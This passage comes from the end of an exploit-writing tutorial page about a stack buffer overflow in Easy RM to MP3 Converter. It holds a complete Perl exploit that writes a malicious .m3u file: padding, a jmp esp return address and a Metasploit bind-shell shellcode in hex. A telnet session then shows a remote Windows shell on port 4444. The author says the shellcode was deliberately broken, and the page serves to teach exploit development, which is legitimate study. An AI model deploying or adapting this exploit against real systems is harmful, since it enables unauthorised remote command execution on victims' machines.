<span style="color: #006080;">"\x56\x50\x53\x45\x36\x45\x38\x50\x33\x50\x32\x42\x48\x43"</span> .
<span style="color: #006080;">&lt;...&gt;</span>
<span style="color: #006080;">"\x50\x41\x41"</span>;</pre>
</div>
<p>Let’s use this shellcode. The new exploit looks like this :&nbsp; P.S. I have manually broken the shellcode shown here. So if you copy &amp; paste the exploit it will not work. But you should know by now how to make a working exploit.</p>
<div>
<pre style="line-height: 12pt; background-color: #f4f4f4; margin: 0em; width: 100%; font-family: consolas, 'Courier New', courier, monospace; color: black; font-size: 8pt; overflow: visible; border-style: none; padding: 0px;">#
# Exploit <span style="color: #5576D1;">for</span> Easy RM to MP3 27.3.700 vulnerability, discovered by Crazy_Hacker
# Written by Peter Van Eeckhoutte
# http:<span style="color: #d7df01;">//www.corelan.be</span>
# Greetings to Saumil and SK :-)
#
# tested on Windows XP SP3 (En)
#
#
#
my $file= <span style="color: #006080;">"exploitrmtomp3.m3u"</span>;

my $junk= <span style="color: #006080;">"A"</span> x 26094;
my $eip = pack(<span style="color: #006080;">'V'</span>,0x01ccf23a);  #jmp esp from MSRMCcodec02.dll

my $shellcode = <span style="color: #006080;">"\x90"</span> x 25;

# windows/shell_bind_tcp - 703 bytes
# http:<span style="color: #d7df01;">//www.metasploit.com</span>
# Encoder: x86/alpha_upper
# EXITFUNC=seh, LPORT=4444, RHOST=
$shellcode=$shellcode.<span style="color: #006080;">"\x89\xe1\xdb\xd4\xd9\x71\xf4\x58\x50\x59\x49\x49\x49\x49"</span> .
<span style="color: #006080;">"\x43\x43\x43\x43\x43\x43\x51\x5a\x56\x54\x58\x33\x30\x56"</span> .
<span style="color: #006080;">"\x58\x34\x41\x50\x30\x41\x33\x48\x48\x30\x41\x30\x30\x41"</span> .
<span style="color: #006080;">"\x42\x41\x41\x42\x54\x00\x41\x51\x32\x41\x42\x32\x42\x42"</span> .
<span style="color: #006080;">"\x30\x42\x42\x58\x50\x38\x41\x43\x4a\x4a\x49\x4b\x4c\x42"</span> .
<span style="color: #006080;">"\x4a\x4a\x4b\x50\x4d\x4b\x58\x4c\x39\x4b\x4f\x4b\x4f\x4b"</span> .
<span style="color: #006080;">"\x4f\x43\x50\x4c\x4b\x42\x4c\x51\x34\x51\x34\x4c\x4b\x47"</span> .
<span style="color: #006080;">"\x35\x47\x4c\x4c\x4b\x43\x4c\x44\x45\x44\x38\x45\x51\x4a"</span> .
<span style="color: #006080;">"\x4f\x4c\x4b\x50\x4f\x42\x38\x4c\x4b\x51\x4f\x51\x30\x43"</span> .
<span style="color: #006080;">"\x31\x4a\x4b\x50\x49\x4c\x4b\x46\x54\x4c\x4b\x43\x31\x4a"</span> .
<span style="color: #006080;">"\x4e\x46\x51\x49\x50\x4a\x39\x4e\x4c\x4d\x54\x49\x50\x44"</span> .
<span style="color: #006080;">"\x34\x45\x57\x49\x51\x49\x5a\x44\x4d\x43\x31\x49\x52\x4a"</span> .
<span style="color: #006080;">"\x4b\x4a\x54\x47\x4b\x51\x44\x51\x34\x47\x58\x44\x35\x4a"</span> .
<span style="color: #006080;">"\x45\x4c\x4b\x51\x4f\x47\x54\x43\x31\x4a\x4b\x45\x36\x4c"</span> .
<span style="color: #006080;">"\x4b\x44\x4c\x50\x4b\x4c\x4b\x51\x4f\x45\x4c\x45\x51\x4a"</span> .
<span style="color: #006080;">"\x4b\x44\x43\x46\x4c\x4c\x4b\x4d\x59\x42\x4c\x46\x44\x45"</span> .
<span style="color: #006080;">"\x4c\x43\x51\x48\x43\x46\x51\x49\x4b\x45\x34\x4c\x4b\x50"</span> .
<span style="color: #006080;">"\x43\x50\x30\x4c\x4b\x51\x50\x44\x4c\x4c\x4b\x42\x50\x45"</span> .
<span style="color: #006080;">"\x4c\x4e\x4d\x4c\x4b\x51\x50\x45\x58\x51\x4e\x43\x58\x4c"</span> .
<span style="color: #006080;">"\x4e\x50\x4e\x44\x4e\x4a\x4c\x50\x50\x4b\x4f\x48\x56\x43"</span> .
<span style="color: #006080;">"\x56\x50\x53\x45\x36\x45\x38\x50\x33\x50\x32\x42\x48\x43"</span> .
<span style="color: #006080;">"\x47\x43\x43\x47\x42\x51\x4f\x50\x54\x4b\x4f\x48\x50\x42"</span> .
<span style="color: #006080;">"\x48\x48\x4b\x4a\x4d\x4b\x4c\x47\x4b\x50\x50\x4b\x4f\x48"</span> .
<span style="color: #006080;">"\x56\x51\x4f\x4d\x59\x4d\x35\x45\x36\x4b\x31\x4a\x4d\x43"</span> .
<span style="color: #006080;">"\x38\x43\x32\x46\x35\x43\x5a\x44\x42\x4b\x4f\x4e\x30\x42"</span> .
<span style="color: #006080;">"\x48\x48\x59\x45\x59\x4c\x35\x4e\x4d\x50\x57\x4b\x4f\x48"</span> .
<span style="color: #006080;">"\x56\x46\x33\x46\x33\x46\x33\x50\x53\x50\x53\x50\x43\x51"</span> .
<span style="color: #006080;">"\x43\x51\x53\x46\x33\x4b\x4f\x4e\x30\x43\x56\x45\x38\x42"</span> .
<span style="color: #006080;">"\x31\x51\x4c\x42\x46\x46\x33\x4c\x49\x4d\x31\x4a\x35\x42"</span> .
<span style="color: #006080;">"\x48\x4e\x44\x44\x5a\x44\x30\x49\x57\x50\x57\x4b\x4f\x48"</span> .
<span style="color: #006080;">"\x56\x43\x5a\x44\x50\x50\x51\x51\x45\x4b\x4f\x4e\x30\x43"</span> .
<span style="color: #006080;">"\x58\x49\x34\x4e\x4d\x46\x4e\x4b\x59\x50\x57\x4b\x4f\x4e"</span> .
<span style="color: #006080;">"\x36\x50\x53\x46\x35\x4b\x4f\x4e\x30\x42\x48\x4d\x35\x50"</span> .
<span style="color: #006080;">"\x49\x4d\x56\x50\x49\x51\x47\x4b\x4f\x48\x56\x50\x50\x50"</span> .
<span style="color: #006080;">"\x54\x50\x54\x46\x35\x4b\x4f\x48\x50\x4a\x33\x45\x38\x4a"</span> .
<span style="color: #006080;">"\x47\x44\x39\x48\x46\x43\x49\x50\x57\x4b\x4f\x48\x56\x50"</span> .
<span style="color: #006080;">"\x55\x4b\x4f\x48\x50\x42\x46\x42\x4a\x42\x44\x45\x36\x45"</span> .
<span style="color: #006080;">"\x38\x45\x33\x42\x4d\x4d\x59\x4b\x55\x42\x4a\x46\x30\x50"</span> .
<span style="color: #006080;">"\x59\x47\x59\x48\x4c\x4b\x39\x4a\x47\x43\x5a\x50\x44\x4b"</span> .
<span style="color: #006080;">"\x39\x4b\x52\x46\x51\x49\x50\x4c\x33\x4e\x4a\x4b\x4e\x47"</span> .
<span style="color: #006080;">"\x32\x46\x4d\x4b\x4e\x51\x52\x46\x4c\x4d\x43\x4c\x4d\x42"</span> .
<span style="color: #006080;">"\x5a\x50\x38\x4e\x4b\x4e\x4b\x4e\x4b\x43\x58\x42\x52\x4b"</span> .
<span style="color: #006080;">"\x4e\x4e\x53\x42\x36\x4b\x4f\x43\x45\x51\x54\x4b\x4f\x49"</span> .
<span style="color: #006080;">"\x46\x51\x4b\x46\x37\x46\x32\x50\x51\x50\x51\x46\x31\x42"</span> .
<span style="color: #006080;">"\x4a\x45\x51\x46\x31\x46\x31\x51\x45\x50\x51\x4b\x4f\x48"</span> .
<span style="color: #006080;">"\x50\x43\x58\x4e\x4d\x4e\x39\x45\x55\x48\x4e\x51\x43\x4b"</span> .
<span style="color: #006080;">"\x4f\x49\x46\x43\x5a\x4b\x4f\x4b\x4f\x47\x47\x4b\x4f\x48"</span> .
<span style="color: #006080;">"\x50\x4c\x4b\x46\x37\x4b\x4c\x4c\x43\x49\x54\x45\x34\x4b"</span> .
<span style="color: #006080;">"\x4f\x4e\x36\x50\x52\x4b\x4f\x48\x50\x43\x58\x4c\x30\x4c"</span> .
<span style="color: #006080;">"\x4a\x44\x44\x51\x4f\x46\x33\x4b\x4f\x48\x56\x4b\x4f\x48"</span> .
<span style="color: #006080;">"\x50\x41\x41"</span>;

open($FILE,<span style="color: #006080;">"&gt;$file"</span>);
print $FILE $junk.$eip.$shellcode;
close($FILE);
print <span style="color: #006080;">"m3u File Created successfully\n"</span>;</pre>
</div>
<p>Create the m3u file, open it in the application.&nbsp; Easy RM to MP3 now seems to hang :</p>
<p><a href="/wp-content/uploads/2009/07/image16.png" target="_blank" rel="noopener noreferrer" class="thickbox no_icon" data-wpel-link="internal"><img loading="lazy" decoding="async" style="display: inline; border-width: 0px;" title="image" src="/wp-content/uploads/2009/07/image_thumb16.png" alt="image" width="384" height="154" border="0"></a></p>
<p>Telnet to this host on port 4444 :</p>
<div>
<pre style="line-height: 12pt; background-color: #f4f4f4; margin: 0em; width: 100%; font-family: consolas, 'Courier New', courier, monospace; color: black; font-size: 8pt; overflow: visible; border-style: none; padding: 0px;"><a href="mailto:root@bt:/">root@bt:/</a># telnet 192.168.0.197 4444
Trying 192.168.0.197...
Connected to 192.168.0.197.
Escape character <span style="color: #5576D1;">is</span> <span style="color: #006080;">'^]'</span>.
Microsoft Windows XP [Version 5.1.2600]
(C) Copyright 1985-2001 Microsoft Corp.

C:\Program Files\Easy RM to MP3 Converter&gt;</pre>
</div>
<p>Pataboom !</p>
<p>Now go out and build your own exploits. Don’t forget to make yourself some nice ascii art, get a l33t name, and send your greetings to me (corelanc0d3r) :-)</p>
<p style="text-align:left">© 2009 – 2021, <a href="https://www.corelan.be" data-wpel-link="internal">Peter Van Eeckhoutte (corelanc0d3r)</a>. All rights reserved. </p>
<div class="yarpp yarpp-related yarpp-related-website yarpp-template-thumbnails">
<!-- YARPP Thumbnails -->
<h3>Similar/Related posts:</h3>
<div class="yarpp-thumbnails-horizontal">
<a class="yarpp-thumbnail" rel="norewrite" href="https://www.corelan.be/index.php/2009/07/23/writing-buffer-overflow-exploits-a-quick-and-basic-tutorial-part-2/" title="Exploit writing tutorial part 2 : Stack Based Overflows – jumping to shellcode" data-wpel-link="internal">
<span class="yarpp-thumbnail-default"><img src="/images/article.png" alt="Default Thumbnail" data-pin-nopin="true"></span><span class="yarpp-thumbnail-title">Exploit writing tutorial part 2 : Stack Based Overflows – jumping to shellcode</span></a>
<a class="yarpp-thumbnail" rel="norewrite" href="https://www.corelan.be/index.php/2009/07/28/seh-based-exploit-writing-tutorial-continued-just-another-example-part-3b/" title="Exploit writing tutorial part 3b : SEH Based Exploits – just another example" data-wpel-link="internal">
<span class="yarpp-thumbnail-default"><img src="/images/article.png" alt="Default Thumbnail" data-pin-nopin="true"></span><span class="yarpp-thumbnail-title">Exploit writing tutorial part 3b : SEH Based Exploits – just another example</span></a>
<a class="yarpp-thumbnail" rel="norewrite" href="https://www.corelan.be/index.php/2009/07/25/writing-buffer-overflow-exploits-a-quick-and-basic-tutorial-part-3-seh/" title="Exploit writing tutorial part 3 : SEH Based Exploits" data-wpel-link="internal">
<span class="yarpp-thumbnail-default"><img src="/images/article.png" alt="Default Thumbnail" data-pin-nopin="true"></span><span class="yarpp-thumbnail-title">Exploit writing tutorial part 3 : SEH Based Exploits</span></a>
<a class="yarpp-thumbnail" rel="norewrite" href="https://www.corelan.be/index.php/2009/09/05/exploit-writing-tutorial-part-5-how-debugger-modules-plugins-can-speed-up-basic-exploit-development/" title="Exploit writing tutorial part 5 : How debugger modules &amp; plugins can speed up basic exploit development" data-wpel-link="internal">
<span class="yarpp-thumbnail-default"><img src="/images/article.png" alt="Default Thumbnail" data-pin-nopin="true"></span><span class="yarpp-thumbnail-title">Exploit writing tutorial part 5 : How debugger modules &amp; plugins can speed up basic exploit development</span></a>
<a class="yarpp-thumbnail" rel="norewrite" href="https://www.corelan.be/index.php/2009/09/21/exploit-writing-tutorial-part-6-bypassing-stack-cookies-safeseh-hw-dep-and-aslr/" title="Exploit writing tutorial part 6 : Bypassing Stack Cookies, SafeSeh, SEHOP, HW DEP and ASLR" data-wpel-link="internal">
<span class="yarpp-thumbnail-default"><img src="/images/article.png" alt="Default Thumbnail" data-pin-nopin="true"></span><span class="yarpp-thumbnail-title">Exploit writing tutorial part 6 : Bypassing Stack Cookies, SafeSeh, SEHOP, HW DEP and ASLR</span></a>
</div>
</div>
	                    <!-- /article-content -->
	                </div>
	                <div class="cleared"></div>
	                <div class="art-postmetadatafooter"><div class="art-postfootericons art-metadata-icons"><span class="categories">Posted in</span> <a href="https://www.corelan.be/index.php/category/security/" rel="category tag" data-wpel-link="internal">001_Security</a>, <a href="https://www.corelan.be/index.php/category/security/exploit-writing-tutorials/" rel="category tag" data-wpel-link="internal">Exploit Writing Tutorials</a>, <a href="https://www.corelan.be/index.php/category/security/exploits/" rel="category tag" data-wpel-link="internal">Exploits</a> | <span class="tags">Tagged</span> <a href="https://www.corelan.be/index.php/tag/41414141/" rel="tag" data-wpel-link="internal">41414141</a>, <a href="https://www.corelan.be/index.php/tag/buffer/" rel="tag" data-wpel-link="internal">buffer</a>, <a href="https://www.corelan.be/index.php/tag/buffer-overflow/" rel="tag" data-wpel-link="internal">buffer overflow</a>, <a href="https://www.corelan.be/index.php/tag/buffersize/" rel="tag" data-wpel-link="internal">buffersize</a>, <a href="https://www.corelan.be/index.php/tag/bytes/" rel="tag" data-wpel-link="internal">bytes</a>, <a href="https://www.corelan.be/index.php/tag/discover/" rel="tag" data-wpel-link="internal">discover</a>, <a href="https://www.corelan.be/index.php/tag/ebp/" rel="tag" data-wpel-link="internal">ebp</a>, <a href="https://www.corelan.be/index.php/tag/eip/" rel="tag" data-wpel-link="internal">eip</a>, <a href="https://www.corelan.be/index.php/tag/esp/" rel="tag" data-wpel-link="internal">esp</a>, <a href="https://www.corelan.be/index.php/tag/exploit/" rel="tag" data-wpel-link="internal">exploit</a>, <a href="https://www.corelan.be/index.php/tag/exploit-laboratory/" rel="tag" data-wpel-link="internal">exploit laboratory</a>, <a href="https://www.corelan.be/index.php/tag/exploit-writing-tutorial/" rel="tag" data-wpel-link="internal">exploit writing tutorial</a>, <a href="https://www.corelan.be/index.php/tag/hack/" rel="tag" data-wpel-link="internal">hack</a>, <a href="https://www.corelan.be/index.php/tag/learn/" rel="tag" data-wpel-link="internal">learn</a>, <a href="https://www.corelan.be/index.php/tag/metasploit/" rel="tag" data-wpel-link="internal">metasploit</a>, <a href="https://www.corelan.be/index.php/tag/nop/" rel="tag" data-wpel-link="internal">nop</a>, <a href="https://www.corelan.be/index.php/tag/nop-sled/" rel="tag" data-wpel-link="internal">nop sled</a>, <a href="https://www.corelan.be/index.php/tag/nop-slide/" rel="tag" data-wpel-link="internal">nop slide</a>, <a href="https://www.corelan.be/index.php/tag/overflow/" rel="tag" data-wpel-link="internal">overflow</a>, <a href="https://www.corelan.be/index.php/tag/pattern_create/" rel="tag" data-wpel-link="internal">pattern_create</a>, <a href="https://www.corelan.be/index.php/tag/pattern_offset/" rel="tag" data-wpel-link="internal">pattern_offset</a>, <a href="https://www.corelan.be/index.php/tag/pop/" rel="tag" data-wpel-link="internal">pop</a>, <a href="https://www.corelan.be/index.php/tag/push/" rel="tag" data-wpel-link="internal">push</a>, <a href="https://www.corelan.be/index.php/tag/register/" rel="tag" data-wpel-link="internal">register</a>, <a href="https://www.corelan.be/index.php/tag/saumil-shah/" rel="tag" data-wpel-link="internal">saumil shah</a>, <a href="https://www.corelan.be/index.php/tag/shellcode/" rel="tag" data-wpel-link="internal">shellcode</a>, <a href="https://www.corelan.be/index.php/tag/sk-chong/" rel="tag" data-wpel-link="internal">sk chong</a>, <a href="https://www.corelan.be/index.php/tag/stack/" rel="tag" data-wpel-link="internal">stack</a>, <a href="https://www.corelan.be/index.php/tag/stack-overflow/" rel="tag" data-wpel-link="internal">stack overflow</a>, <a href="https://www.corelan.be/index.php/tag/write/" rel="tag" data-wpel-link="internal">write</a></div></div>	            </div>
			<div class="cleared"></div>
	    </div>
	</div>
	
	<div class="art-post">
	    <div class="art-post-tl"></div>
	    <div class="art-post-tr"></div>
	    <div class="art-post-bl"></div>
	    <div class="art-post-br"></div>
	    <div class="art-post-tc"></div>
	    <div class="art-post-bc"></div>
	    <div class="art-post-cl"></div>
	    <div class="art-post-cr"></div>
	    <div class="art-post-cc"></div>
	    <div class="art-post-body">
	            <div class="art-post-inner art-article">
	            	                <div class="art-postcontent">
	                    <!-- article-content -->
	                    <h4 id="comments">100 Responses to <em>Exploit writing tutorial part 1 : Stack Based Overflows</em></h4>	                    <!-- /article-content -->
	                </div>
	                <div class="cleared"></div>
	                	            </div>
			<div class="cleared"></div>
	    </div>
	</div>
	
	<ul id="comments-list"><!-- #comment-## -->
<!-- #comment-## -->
<!-- #comment-## -->
<!-- #comment-## -->
<!-- #comment-## -->
<ul class="children">
<!-- #comment-## -->
</ul><!-- .children -->
<!-- #comment-## -->
<!-- #comment-## -->
<!-- #comment-## -->
<!-- #comment-## -->
<ul class="children">
<!-- #comment-## -->
</ul><!-- .children -->
<!-- #comment-## -->
<!-- #comment-## -->
<ul class="children">
<!-- #comment-## -->
<ul class="children">
<!-- #comment-## -->
</ul><!-- .children -->
<!-- #comment-## -->
</ul><!-- .children -->
<!-- #comment-## -->
<ul class="children">
<!-- #comment-## -->
<!-- #comment-## -->
</ul><!-- .children -->
<!-- #comment-## -->
		<li class="post pingback">
			<p>Pingback: <a href="http://www.rec-sec.com/2010/01/22/corelanc0d3r-exploit-tutorials/" class="url wpel-icon-left" rel="ugc external nofollow noopener noreferrer" data-wpel-link="external" target="_blank"><i class="wpel-icon dashicons-before dashicons-admin-site" aria-hidden="true"></i>Recognize-Security | Peter Van Eeckhoutte’s Exploit Writing Tutorials</a></p>
		</li><!-- #comment-## -->
<ul class="children">
<!-- #comment-## -->
</ul><!-- .children -->
<!-- #comment-## -->
<!-- #comment-## -->
<!-- #comment-## -->
<ul class="children">
<!-- #comment-## -->
</ul><!-- .children -->
<!-- #comment-## -->
<ul class="children">
<!-- #comment-## -->
</ul><!-- .children -->
<!-- #comment-## -->
<ul class="children">
<!-- #comment-## -->
</ul><!-- .children -->
<!-- #comment-## -->
<ul class="children">
<ul class="children">
<ul class="children">
<!-- #comment-## -->
</ul><!-- .children -->
<!-- #comment-## -->
</ul><!-- .children -->
<!-- #comment-## -->
</ul><!-- .children -->
<!-- #comment-## -->
<!-- #comment-## -->
<!-- #comment-## -->
<ul class="children">
<ul class="children">
<!-- #comment-## -->
</ul><!-- .children -->
<!-- #comment-## -->
</ul><!-- .children -->
<!-- #comment-## -->
<!-- #comment-## -->
<ul class="children">
<!-- #comment-## -->
</ul><!-- .children -->
<!-- #comment-## -->
<ul class="children">
<!-- #comment-## -->
</ul><!-- .children -->
<!-- #comment-## -->
<ul class="children">
<!-- #comment-## -->
</ul><!-- .children -->
<!-- #comment-## -->
<ul class="children">
<ul class="children">
<ul class="children">
<ul class="children">
<!-- #comment-## -->
<!-- #comment-## -->
</ul><!-- .children -->
<!-- #comment-## -->
</ul><!-- .children -->
<!-- #comment-## -->
</ul><!-- .children -->
<!-- #comment-## -->
</ul><!-- .children -->
<!-- #comment-## -->
		<li class="post pingback">
			<p>Pingback: <a href="http://blog.felix-aime.fr/securite-des-systemes-dinformation/si-toi-aussi-tu-veux-smatcher-du-stack-ou-peter-de-leip-en-2o1o/" class="url wpel-icon-left" rel="ugc external nofollow noopener noreferrer" data-wpel-link="external" target="_blank"><i class="wpel-icon dashicons-before dashicons-admin-site" aria-hidden="true"></i>Si toi aussi, tu veux «&nbsp;Smatcher du stack&nbsp;» ou «&nbsp;péter de l’EIP&nbsp;» en 2o1o | UNTITLED.BLOG</a></p>
		</li><!-- #comment-## -->
<!-- #comment-## -->
		<li class="post pingback">
			<p>Pingback: <a href="http://twitter.com/chs/status/14132402326601728/" class="url wpel-icon-left" rel="ugc external nofollow noopener noreferrer" data-wpel-link="external" target="_blank"><i class="wpel-icon dashicons-before dashicons-admin-site" aria-hidden="true"></i>Carl Sampson (@chs)</a></p>
		</li><!-- #comment-## -->
<!-- #comment-## -->
<ul class="children">
<!-- #comment-## -->
</ul><!-- .children -->
<!-- #comment-## -->
<ul class="children">
<ul class="children">
<!-- #comment-## -->
</ul><!-- .children -->
<!-- #comment-## -->
</ul><!-- .children -->
<!-- #comment-## -->
<!-- #comment-## -->
<ul class="children">
<!-- #comment-## -->
</ul><!-- .children -->
<!-- #comment-## -->
<!-- #comment-## -->
<!-- #comment-## -->
		<li class="post pingback">
			<p>Pingback: <a href="http://lnxg33k.wordpress.com/2011/04/07/video-buffer-overflow-exploitation-stack-based/" class="url wpel-icon-left" rel="ugc external nofollow noopener noreferrer" data-wpel-link="external" target="_blank"><i class="wpel-icon dashicons-before dashicons-admin-site" aria-hidden="true"></i>Video: buffer overflow exploitation (Stack Based) « Lnxg33k's Blog</a></p>
		</li><!-- #comment-## -->
<!-- #comment-## -->
<!-- #comment-## -->
<!-- #comment-## -->
<!-- #comment-## -->
<ul class="children">
<!-- #comment-## -->
</ul><!-- .children -->
<!-- #comment-## -->
<!-- #comment-## -->
<ul class="children">
<!-- #comment-## -->
</ul><!-- .children -->
<!-- #comment-## -->
<!-- #comment-## -->
<!-- #comment-## -->
<!-- #comment-## -->
<!-- #comment-## -->
<ul class="children">
<!-- #comment-## -->
</ul><!-- .children -->
<!-- #comment-## -->
<ul class="children">
<!-- #comment-## -->
</ul><!-- .children -->
<!-- #comment-## -->
<ul class="children">
<!-- #comment-## -->
</ul><!-- .children -->
<!-- #comment-## -->
<!-- #comment-## -->
<ul class="children">
<!-- #comment-## -->
</ul><!-- .children -->
<!-- #comment-## -->
<!-- #comment-## -->
<!-- #comment-## -->
<!-- #comment-## -->
<!-- #comment-## -->
<ul class="children">
<!-- #comment-## -->
</ul><!-- .children -->
<!-- #comment-## -->
<ul class="children">
<!-- #comment-## -->
</ul><!-- .children -->
<!-- #comment-## -->
<!-- #comment-## -->
		<li class="post pingback">
			<p>Pingback: <a href="http://www.quora.com/Computer-Security/What-are-some-resources-that-practically-explain-how-you-can-exploit-bugs-or-vulnerabilities-over-networks-or-websites-Like-cracking-a-WEP-system#ans1595998" class="url wpel-icon-left" rel="ugc external nofollow noopener noreferrer" data-wpel-link="external" target="_blank"><i class="wpel-icon dashicons-before dashicons-admin-site" aria-hidden="true"></i>Computer Security: What are some resources that practically explain how you can exploit bugs or vulnerabilities over networks or websites? Like cracking a WEP system? - Quora</a></p>
		</li><!-- #comment-## -->
</ul>


          <div class="cleared"></div>
        </div>
        <div class="art-layout-cell art-sidebar1">
          <div class="art-block widget widget_search" id="search-2">
    <div class="art-block-tl"></div>
    <div class="art-block-tr"></div>
    <div class="art-block-bl"></div>
    <div class="art-block-br"></div>
    <div class="art-block-tc"></div>
    <div class="art-block-bc"></div>
    <div class="art-block-cl"></div>
    <div class="art-block-cr"></div>
    <div class="art-block-cc"></div>
    <div class="art-block-body"><div class="art-blockcontent">
    <div class="art-blockcontent-body"> <form method="get" name="searchform" action="https://www.corelan.be/">
    <div class="search">
        <input name="s" type="text" value="" style="width: 95%;">
        <span class="art-button-wrapper">
            <span class="art-button-l"> </span>
            <span class="art-button-r"> </span>
            <input class="art-button" type="submit" name="search" value="Search">
        </span>
    </div>
</form>
		<div class="cleared"></div>
    </div>
</div>		<div class="cleared"></div>
    </div>
</div><div class="art-block widget widget_text" id="text-5">
    <div class="art-block-tl"></div>
    <div class="art-block-tr"></div>
    <div class="art-block-bl"></div>
    <div class="art-block-br"></div>
    <div class="art-block-tc"></div>
    <div class="art-block-bc"></div>
    <div class="art-block-cl"></div>
    <div class="art-block-cr"></div>
    <div class="art-block-cc"></div>
    <div class="art-block-body"><div class="art-blockheader">
    <h3 class="t">Corelan Training</h3>
</div><div class="art-blockcontent">
    <div class="art-blockcontent-body">			<div class="textwidget">We have been teaching our win32 exploit dev classes at various security cons and private companies &amp; organizations since 2011 <br><br>Check out our schedules page <b><a href="https://www.corelan-training.com/index.php/training/training-schedules/" data-wpel-link="external" target="_blank" rel="external noopener noreferrer" class="wpel-icon-left"><i class="wpel-icon dashicons-before dashicons-admin-site" aria-hidden="true"></i>here</a> and sign up for one of our classes now!</b></div>
				<div class="cleared"></div>
    </div>
</div>		<div class="cleared"></div>
    </div>
</div><div class="art-block widget widget_text" id="text-9">
    <div class="art-block-tl"></div>
    <div class="art-block-tr"></div>
    <div class="art-block-bl"></div>
    <div class="art-block-br"></div>
    <div class="art-block-tc"></div>
    <div class="art-block-bc"></div>
    <div class="art-block-cl"></div>
    <div class="art-block-cr"></div>
    <div class="art-block-cc"></div>
    <div class="art-block-body"><div class="art-blockheader">
    <h3 class="t">Donate</h3>
</div><div class="art-blockcontent">
    <div class="art-blockcontent-body">			<div class="textwidget">Want to support the Corelan Team community ? <a href="https://www.corelan.be/index.php/donate/" data-wpel-link="internal"><b>Click here to go to our donations page.</b></a><br><br>
<center>Want to donate BTC to Corelan Team? <br><br>
<img src="/wp-content/uploads/2014/01/donate_btc_to_corelan_thumb.png" width="160" ,height="158"></center><br><br>Your donation will help funding server hosting.</div>
				<div class="cleared"></div>
    </div>
</div>		<div class="cleared"></div>
    </div>
</div><div class="art-block widget Advman_Widget" id="advman-6">
    <div class="art-block-tl"></div>
    <div class="art-block-tr"></div>
    <div class="art-block-bl"></div>
    <div class="art-block-br"></div>
    <div class="art-block-tc"></div>
    <div class="art-block-bc"></div>
    <div class="art-block-cl"></div>
    <div class="art-block-cr"></div>
    <div class="art-block-cc"></div>
    <div class="art-block-body"><div class="art-blockcontent">
    <div class="art-blockcontent-body"><script async="" src="https://pagead2.googlesyndication.com/pagead/js/adsbygoogle.js?client=ca-pub-8134501503628637" crossorigin="anonymous" data-checked-head="true"></script>
<ins class="adsbygoogle" style="display: inline-block; width: 160px; height: 0px;" data-ad-client="ca-pub-8134501503628637" data-ad-slot="4006062044" data-adsbygoogle-status="done"><div id="aswift_1_host" style="border: medium; height: 0px; width: 160px; margin: 0px; padding: 0px; position: relative; visibility: visible; background-color: transparent; display: inline-block; overflow: hidden; opacity: 0;"><iframe id="aswift_1" name="aswift_1" style="left: 0px; position: absolute; top: 0px; border: 0px; width: 160px; height: 0px;" sandbox="allow-forms allow-popups allow-popups-to-escape-sandbox allow-same-origin allow-scripts allow-top-navigation-by-user-activation" width="160" height="0" frameborder="0" marginwidth="0" marginheight="0" vspace="0" hspace="0" allowtransparency="true" scrolling="no" src="https://pagead2.googlesyndication.com/pagead/ads?ltd_cs=1&amp;client=ca-pub-8134501503628637&amp;output=html&amp;h=600&amp;slotname=4006062044&amp;adk=1185345918&amp;adf=273665165&amp;pi=t.ma~as.4006062044&amp;w=160&amp;abgtt=3&amp;lmt=1718453401&amp;format=160x600&amp;url=https%3A%2F%2Fwww.corelan.be%2Findex.php%2F2009%2F07%2F19%2Fexploit-writing-tutorial-part-1-stack-based-overflows%2F&amp;host=ca-host-pub-2644536267352236&amp;wgl=1&amp;dt=1718453401121&amp;bpp=2&amp;bdt=1341&amp;idt=502&amp;shv=r20240612&amp;mjsv=m202406110101&amp;ptt=9&amp;saldr=aa&amp;abxe=1&amp;eoidce=1&amp;prev_fmts=0x0&amp;nras=1&amp;correlator=5760699743700&amp;frm=20&amp;pv=1&amp;ga_vid=1580884287.1718453401&amp;ga_sid=1718453401&amp;ga_hid=1621828964&amp;ga_fc=0&amp;u_tz=120&amp;u_his=50&amp;u_h=864&amp;u_w=1536&amp;u_ah=864&amp;u_aw=1536&amp;u_cd=24&amp;u_sd=1.25&amp;adx=925&amp;ady=673&amp;biw=1280&amp;bih=693&amp;scr_x=0&amp;scr_y=0&amp;eid=44759876%2C44759927%2C44759837%2C42531706%2C44795921%2C95331696%2C95331833%2C95334508%2C95334524%2C95334573%2C95334578%2C95335888%2C95334052%2C95335290&amp;oid=2&amp;pvsid=4106273848482318&amp;tmod=1522521028&amp;uas=0&amp;nvt=1&amp;fc=1920&amp;brdim=-25600%2C-25600%2C-25600%2C-25600%2C1536%2C0%2C159%2C27%2C1280%2C692&amp;vis=2&amp;rsz=%7C%7CoeEr%7C&amp;abl=CS&amp;pfx=0&amp;fu=0&amp;bc=31&amp;bz=0.12&amp;ifi=2&amp;uci=a!2&amp;fsb=1&amp;dtd=509" data-google-container-id="a!2" tabindex="0" title="Advertisement" aria-label="Advertisement" data-google-query-id="CPeKluTJ3YYDFYIvVQgd7LYLAw" data-load-complete="true"></iframe></div></ins>
<script>
     (adsbygoogle = window.adsbygoogle || []).push({});
</script>
		<div class="cleared"></div>
    </div>
</div>		<div class="cleared"></div>
    </div>
</div><div class="art-block widget widget_text" id="text-3">
    <div class="art-block-tl"></div>
    <div class="art-block-tr"></div>
    <div class="art-block-bl"></div>
    <div class="art-block-br"></div>
    <div class="art-block-tc"></div>
    <div class="art-block-bc"></div>
    <div class="art-block-cl"></div>
    <div class="art-block-cr"></div>
    <div class="art-block-cc"></div>
    <div class="art-block-body"><div class="art-blockheader">
    <h3 class="t">Corelan Team Merchandise</h3>
</div><div class="art-blockcontent">
    <div class="art-blockcontent-body">			<div class="textwidget">You can support Corelan Team by donating or purchasing items from <b><a href="http://www.cafepress.com/CorelanTeam" data-wpel-link="external" target="_blank" rel="external noopener noreferrer" class="wpel-icon-left"><i class="wpel-icon dashicons-before dashicons-admin-site" aria-hidden="true"></i>the official Corelan Team merchandising store.</a></b> <br></div>
				<div class="cleared"></div>
    </div>
</div>		<div class="cleared"></div>
    </div>
</div><div class="art-widget widget widget_text" id="text-2"><div class="art-widget-content">			<div class="textwidget"><br><center><a href="http://www.copyscape.com/plagiarism-tool/"><img src="/wp-content/images/cs-gy-88x31.gif" alt="Protected by Copyscape Web Plagiarism Tool" title="Protected by Copyscape Plagiarism Checker - Do not copy content from this page." width="88" height="31" border="0"></a></center><br></div>
		</div></div><div class="art-block widget widget_text" id="text-6">
    <div class="art-block-tl"></div>
    <div class="art-block-tr"></div>
    <div class="art-block-bl"></div>
    <div class="art-block-br"></div>
    <div class="art-block-tc"></div>
    <div class="art-block-bc"></div>
